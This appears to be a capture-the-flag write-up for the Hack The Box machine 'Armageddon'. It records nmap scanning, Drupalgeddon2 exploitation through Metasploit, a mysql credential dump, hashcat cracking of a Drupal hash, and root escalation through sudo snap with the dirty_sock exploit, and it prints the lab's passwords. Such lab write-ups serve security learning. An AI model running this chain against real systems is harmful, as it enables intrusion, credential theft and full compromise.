# Armageddon

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial 10.10.10.233 -v`

### Open ports

```
22
80
```

## Users

```
brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
brucetherealadmin:booboo
drupaluser:CQHEy@9M*m23gBVj
```

## Endpoints

```
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]  
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/profiles
```


## Vuln

* Vuln to Drupalgeddon 2 
* Used `unix/webapp/drupal_drupalgeddon2` module from metasploit setting `RHOST` to the target host and `LHOST` my machine
* Found drupal creds in `sites/default/settings.php`

```php
databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
* got into db and checked users creds using `mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users';`
* got hash , since we are using drupal i tried hashcat with 7900 saying is a drupal hash `hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt` and got `booboo`
* ssh with `brucetherealadmin@10.10.10.233` using password `booboo` got user flag
* doing `sudo -l` we can execute snap has sudo
* so we can priv esc (`see references`)
* using `exploit` and then doing `sudo snap install something.snap --dangerous --devmode` creates the dirty_sock user with sudo privileges
* logging to `dirty_sock` user and doing `sudo su` we are able to priv esc to `root` and get the root flag

# References

* https://www.google.com/search?client=firefox-b-d&q=rapid7+drupalgeddorn
* http://www.hackersnotes.com/blog/pentest/linux-privilege-escalation-via-snapd-using-dirty_sock-exploit-and-demonstration-of-cve-2019-7304/
* https://gtfobins.github.io/gtfobins/snap/